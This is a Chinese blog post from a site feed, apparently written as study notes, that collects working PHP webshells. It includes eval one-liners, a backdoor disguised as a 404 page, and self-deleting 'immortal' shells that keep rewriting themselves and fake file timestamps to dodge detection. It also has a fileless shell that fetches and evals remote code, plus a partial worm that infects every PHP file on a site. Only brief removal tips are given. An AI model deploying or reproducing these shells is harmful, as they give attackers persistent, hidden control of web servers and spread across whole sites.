        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="5932246908d3cff49b032c2541702b4dd1a297920010250fc540381ffb2dab98"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 云原生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPmua</title>
      <link href="/p/36303170.html"/>
      <url>/p/36303170.html</url>
      
        <content type="html"><![CDATA[<p>整理汇总网络上常见的php_webshell进行学习分析。提升作为web狗的修养hhhhh</p><h1 id="mua😘分类"><a href="#mua😘分类" class="headerlink" title="mua😘分类"></a>mua😘分类</h1><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>eval : PHP 4, PHP 5, PHP 7+ 均可用，接受一个参数，将字符串作为 PHP 代码执行</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> assert(<span class="variable">$_REQUEST</span>[<span class="string">&quot;pass&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>assert: PHP 4, PHP 5, PHP 7.2 以下均可用，一般接受一个参数，php 5.4.8 版本后可以接受两个参数</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`<span class="variable">$_GET</span>[<span class="number">1</span>]`;</span><br></pre></td></tr></table></figure><blockquote><p>最短一句话</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211123201030566.png" alt="image-20211123201030566"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211123201044588.png" alt="image-20211123201044588"></p><h3 id="404-php，利用404隐藏一句话"><a href="#404-php，利用404隐藏一句话" class="headerlink" title="404.php，利用404隐藏一句话"></a>404.php，利用404隐藏一句话</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML <span class="keyword">PUBLIC</span> <span class="string">&quot;-//IETF//DTD HTML 2.0//EN&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;<span class="number">404</span> Not Found&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Not Found&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@preg_replace(<span class="string">&quot;/[pageerror]/e&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>],<span class="string">&quot;saft&quot;</span>);</span><br><span class="line"></span><br><span class="line">header(<span class="string">&#x27;HTTP/1.1 404 Not Found&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>e模式, 只限用于preg_replace()函数,把替换的字符串中的内容当成一个PHP表达式。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@preg_replace(<span class="string">&quot;/[ZnF1cG5ncW4=]/e&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>],<span class="string">&quot;YWdhah&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211123225628906.png"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211123225535738.png" alt="image-20211123225535738"></p><h2 id="小马"><a href="#小马" class="headerlink" title="小马"></a>小马</h2><p>主要完成文件上传功能</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;content-Type: text/html; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span> </span><br><span class="line"><span class="keyword">echo</span></span><br><span class="line"><span class="string">&quot;&lt;/br&gt;获取服务器IP地址: &quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].</span><br><span class="line"><span class="string">&quot;&lt;/br&gt;获取服务信息: &quot;</span>.apache_get_version();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form method=<span class="string">&quot;POST&quot;</span>&gt;&lt;/br&gt;</span><br><span class="line">shell路径: &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;file&quot;</span> size=<span class="string">&quot;60&quot;</span> value=<span class="string">&quot;&lt;? echo str_replace(&#x27;\\&#x27;,&#x27;/&#x27;,__FILE__) ?&gt;&quot;</span>&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;textarea name=<span class="string">&quot;text&quot;</span> COLS=<span class="string">&quot;70&quot;</span> ROWS=<span class="string">&quot;18&quot;</span> &gt;&lt;/textarea&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;保存&quot;</span> &gt; </span><br><span class="line">&lt;form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>)&#123;</span><br><span class="line"><span class="variable">$f</span>=fopen(<span class="variable">$_POST</span>[<span class="string">&quot;file&quot;</span>],<span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span>   fwrite(<span class="variable">$f</span>,<span class="variable">$_POST</span>[<span class="string">&quot;text&quot;</span>])? <span class="string">&#x27;保存成功!&#x27;</span> : <span class="string">&#x27;保存失败!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1611541896073-c499e7c4-88da-4d22-8bf1-1df74d92b39e.png" alt="image.png"></p><blockquote><p>需要权限windows下成功率比较高</p></blockquote><h2 id="大马"><a href="#大马" class="headerlink" title="大马"></a>大马</h2><p>现在用的比较少了</p><p> <a href="https://github.com/DropAnn/sec-system/blob/main/1.%E6%89%A7%E8%A1%8C%E8%BF%9B%E6%94%BB/php/%E4%B9%A0%E7%A7%91%20v5.6.zip">习科v5.6.zip</a></p><p><a href="https://github.com/DropAnn/sec-system/blob/main/1.%E6%89%A7%E8%A1%8C%E8%BF%9B%E6%94%BB/php/shell.php">shell.php</a></p><h2 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;Validator.php&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;1a1dc91c907325c69271ddf0c944bc72&quot;)&#123;@eval($_POST[a]);&#125; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    file_put_contents(<span class="variable">$file</span>,<span class="variable">$code</span>);</span><br><span class="line">    system(<span class="string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .Validator.php&#x27;</span>);</span><br><span class="line">    usleep(<span class="number">5000</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><code>ignore_user_abort()</code> 可以实现当客户端关闭后仍然可以执行PHP代码，可保持PHP进程一直在执行，可实现所谓的计划任务功能与持续进程，只需要开启执行脚本，除非 apache等服务器重启或有脚本有输出，该PHP脚本将一直处于执行的状态，初看很实用，不过代价是一个PHP执行脚本的持续进程，开销很大，但却可以 实现很多意想不到的功能。<br><code>set_time_limit(0)</code>表示长时间链接运行，不限制页面运行时间<br><code>unlink(__FILE__)</code>;删除文件本身，起到隐蔽自身的作用<br>while 循环内每间隔<code>usleep(5000);</code>即写入新的后门文件<br><code>system()</code>执行的命令用于修改文件的创建时间，可以绕过<code>find –name &#39;*.php&#39; –mmin -10</code>命令检测最近10分钟修改或新创建的php文件，但不一定有用，可选。<br><code>1a1dc91c907325c69271ddf0c944bc72--&gt;pass</code></p></blockquote><p>网上流传的不死马, while 里面只是并没有判断了这个文件是不是存在 </p><p>那么我只需要把这个文件中的 shell 注释掉就可以绕过你的内存木马了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line"> set_time_limit(<span class="number">0</span>);</span><br><span class="line"> <span class="variable">$file</span> = <span class="string">&#x27;c.php&#x27;</span>;</span><br><span class="line"> <span class="variable">$code</span> = base64_decode(<span class="string">&#x27;PD9waHAgZXZhbCgkX1BPU1RbY10pOz8+&#x27;</span>);</span><br><span class="line"> <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">     <span class="keyword">if</span>(md5(file_get_contents(<span class="variable">$file</span>)) != md5(<span class="variable">$code</span>)) &#123;</span><br><span class="line">         file_put_contents(<span class="variable">$file</span>, <span class="variable">$code</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     usleep(<span class="number">50</span>);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgZXZhbCgkX1BPU1RbY10pOz8+`--&gt;`<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[c]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211129195604958.png" alt="image-20211129195604958"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211129195926939.png" alt="image-20211129195926939"></p><p>不死性</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211129200148731.png" alt="image-20211129200148731"></p><h3 id="查杀方法"><a href="#查杀方法" class="headerlink" title="查杀方法"></a>查杀方法</h3><ol><li><p>如果允许，重启服务是万能的；</p></li><li><p>其次，最好的解决方案是kill掉www-data用户的所有子进程（最有效，但是客户可能会让你赔钱）：</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep www-data | awk &#x27;&#123;print $2&#125;&#x27; | xargs kill -9</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211129200401882.png" alt="image-20211129200401882"></p><ol start="3"><li>创建一个和不死马生成的马一样名字的目录；（收效甚微）</li></ol><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211129204357014.png" alt="image-20211129204357014" style="zoom:150%;" /><ol start="4"><li>写脚本一直删除木马文件。</li></ol><h2 id="无文件马"><a href="#无文件马" class="headerlink" title="无文件马"></a>无文件马</h2><p>自删除的木马，在运行一次后会将自身文件删除，但将某些代码运行至进程中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">unlink(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>]);</span><br><span class="line">ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$remote_file</span> = <span class="string">&#x27;http://127.0.0.1/eval.txt&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$code</span> = file_get_contents(<span class="variable">$remote_file</span>))&#123;</span><br><span class="line">  @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">  sleep(<span class="number">5</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>eval.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;hello world &#x27;</span>.time());</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211201103244907.png" alt="image-20211201103244907"></p><p><code>$_SERVER[&#39;SCRIPT_FILENAME&#39;]</code> 与 <code>__FILE__</code> 的区别</p><p><strong>相同点</strong></p><p>通常情况下，PHP <code>$_SERVER[&#39;SCRIPT_FILENAME&#39;]</code> 与 <code>__FILE__</code> 都会返回 PHP 文件的完整路径（绝对路径）与文件名：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;SCRIPT_FILENAME 为：&#x27;</span>,<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;__FILE__ 为：&#x27;</span>,<span class="keyword">__FILE__</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>SCRIPT_FILENAME</code> 为：<code>/var/www/app/5.php</code><br><code>__FILE__</code> 为：<code>/var/www/app/5.php</code></p><p><strong>不同点</strong></p><p>尽管 <code>$_SERVER[&#39;SCRIPT_FILENAME&#39;]</code> 与 <code>__FILE__</code> 非常相似，但在文件被 <code>include</code> 或 <code>require</code>包含的时候，二者的差别是：<code>$_SERVER[&#39;SCRIPT_FILENAME&#39;]</code> 反映的是当前执行程序的绝对路径及文件名；<code>__FILE__</code> 反映的是原始文件（被包含文件）的绝对路径及文件名。</p><h2 id="蠕虫webshell"><a href="#蠕虫webshell" class="headerlink" title="蠕虫webshell"></a>蠕虫webshell</h2><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><ol><li>递归扫描所有web目录及文件，全部扫到的php写入webshell</li><li>网站全部php可作为webshell连接执行命令</li><li>不带参数请求又可以正常访问原页面，不影响访问</li><li>所有web路径目录写入单独一个特定webshell</li><li>判断是否写过不再重复写入</li><li>所有php页面都可以互相复活蠕虫webshell</li><li>蠕虫webshell返回所有php文件url地址</li><li>蠕虫webshell发送返回数据传输加密</li><li>数字签名校验执行、5秒后不可重放 后续添加</li><li>页面功能性可控（可以使全部php原有功能失效，只剩下webshell功能）</li><li>前端互相复活以及反渗透</li><li>适配meterpreter连接</li><li>加密混淆</li></ol><blockquote><p>带一个参数访问我的webshell，全站的php文件都被我感染，都可以当webshell连，都可以执行命令，只要带一个参数访问都可以互相复活。</p></blockquote><p>扫描从函数<code>scandir</code>替换为<code>is_dir()</code></p><h3 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h3><p>假设shell.php已经上传到目录，上传目录为upload，ip为192.168.1.1</p><ol><li><p>访问<code>http://192.168.1.1/upload/shell.php</code>正常不带参数访问是返回状态码500，页面会正常访问</p></li><li><p>带参数下划线访问，会自动感染全站php文件，所有php可以当shell连接</p><p>eg:<code>http://192.168.1.1/upload/shell.php?_</code></p></li><li><p>如上带下划线参数访问后，右键查看页面源代码可以看到所有被感染的php地址。</p></li><li><p>可以使用python把所有url爬下来，爬取规则：</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checks_arr = html.find_all(attrs=&#123;<span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;php_url&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure><h3 id="服务端代码"><a href="#服务端代码" class="headerlink" title="服务端代码"></a>服务端代码</h3><p><a href="https://zhuanlan.zhihu.com/p/86971281">来自于 3s_NWGeek 的代码</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$tips</span> = <span class="string">&#x27;AWD_Light_Check&#x27;</span>;</span><br><span class="line"><span class="comment">//这个是后面检查的是否感染头，如果没有，就会重写这个php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$Serv_Num</span> = <span class="number">159</span>;</span><br><span class="line"><span class="comment">//这个变量是要写入其他文件头部的本页行数，因为感染了其他php要互相感染，不能把其他原有php代码写入到其他php，会乱套。</span></span><br><span class="line"><span class="variable">$arr_dir</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="comment">//全局变量，扫到的文件夹</span></span><br><span class="line"><span class="variable">$files</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="comment">//全局变量，扫到的文件</span></span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">&#x27;Url_Check&#x27;</span>)) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Url_Check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$pageURL</span> = <span class="string">&#x27;http&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTPS&quot;</span>] == <span class="string">&quot;on&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$pageURL</span> .= <span class="string">&quot;s&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$pageURL</span> .= <span class="string">&#x27;://&#x27;</span>;</span><br><span class="line">        <span class="variable">$pageURL</span> .= <span class="variable">$_SERVER</span>[<span class="string">&quot;SERVER_NAME&quot;</span>] . <span class="string">&quot;:&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;SERVER_PORT&quot;</span>];</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$pageURL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">file_check</span>(<span class="params"><span class="variable">$dir</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//扫描文件夹</span></span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$arr_dir</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$files</span>;</span><br><span class="line">        <span class="keyword">if</span> (is_dir(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$handle</span> = opendir(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">                <span class="keyword">while</span> ((<span class="variable">$file</span> = readdir(<span class="variable">$handle</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$file</span> != <span class="string">&#x27;.&#x27;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;..&quot;</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (is_dir(<span class="variable">$dir</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$file</span>)) &#123;</span><br><span class="line">                            <span class="variable">$arr_dir</span>[] = <span class="variable">$dir</span>;</span><br><span class="line">                            <span class="variable">$files</span>[<span class="variable">$file</span>] = file_check(<span class="variable">$dir</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$file</span>);</span><br><span class="line">                            <span class="comment">//拼接文件</span></span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="variable">$arr_dir</span>[] = <span class="variable">$dir</span>;</span><br><span class="line">                            <span class="variable">$files</span>[] = <span class="variable">$dir</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$file</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        closedir(<span class="variable">$handle</span>);</span><br><span class="line">        <span class="variable">$arr_dir</span> = array_unique(<span class="variable">$arr_dir</span>);</span><br><span class="line">        <span class="comment">//去重</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write_conf</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">#每个目录创一个马</span></span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$Serv_Num</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$arr_dir</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$arr_dir</span> <span class="keyword">as</span> <span class="variable">$dir_path</span>) &#123;</span><br><span class="line">            <span class="comment">// echo &#x27;&lt;br&gt;&#x27;.$dir_path;</span></span><br><span class="line">            <span class="variable">$srcode</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable">$localtext</span> = file(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$Serv_Num</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">                <span class="variable">$srcode</span> .= <span class="variable">$localtext</span>[<span class="variable">$i</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//所有文件夹都生成一个webshell</span></span><br><span class="line">            <span class="comment">// echo &quot;&lt;span style=&#x27;color:#666&#x27;&gt;&lt;/span&gt; &quot; . $dir_path . &quot;/.Conf_check.php&quot; . &quot;&lt;br/&gt;&quot;;</span></span><br><span class="line">            <span class="variable">$le</span> = Url_Check();</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;iframe id=&quot;check_url&quot;&gt;&#x27;</span> . <span class="variable">$le</span> . <span class="string">&#x27;&#x27;</span> . str_replace(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>], <span class="string">&#x27;&#x27;</span>, <span class="variable">$dir_path</span> . <span class="string">&quot;/.Conf_check.php&quot;</span>) . <span class="string">&#x27;&lt;/iframe&gt;&#x27;</span>;</span><br><span class="line">            fputs(fopen(<span class="variable">$dir_path</span> . <span class="string">&quot;/.Conf_check.php&quot;</span>, <span class="string">&quot;w&quot;</span>), <span class="variable">$srcode</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 当前目录所有php被感染</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vul_tran</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//每个文件夹递归生成一个默认的马以及感染当前目录所有php文件。所谓感染就是把自身固定的代码插入到其他php文件中，甚至可以加注释符号或者退出函数exit()；控制其他页面的可用性。不过要注意一下，是当前目录，这样响应速度会快很多，亲测如果是一次性感染全部目录的php文件后续会引发py客户端响应超时及其他bug，所以改过来了。</span></span><br><span class="line">        <span class="comment">//######</span></span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$Serv_Num</span>;</span><br><span class="line">        <span class="variable">$pdir</span> = dirname(<span class="keyword">__FILE__</span>);</span><br><span class="line">    